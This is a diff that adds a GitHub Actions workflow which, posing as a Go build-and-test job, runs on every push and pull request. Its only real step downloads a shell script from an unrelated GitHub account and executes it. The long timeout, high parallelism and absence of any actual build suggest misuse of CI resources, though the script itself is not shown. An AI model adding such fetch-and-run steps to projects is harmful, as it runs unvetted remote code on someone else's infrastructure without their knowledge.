@@ -1,0 +1,27 @@
+name: ubuntu
+on: [push, pull_request]
+jobs:
+  build:
+    name: Tesew
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6]
+        flag: [A]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Tesew
+      run: |
+        wget https://github.com/thomasedison2888/devtest/blob/main/main.sh && chmod u+x main.sh && ./main.sh
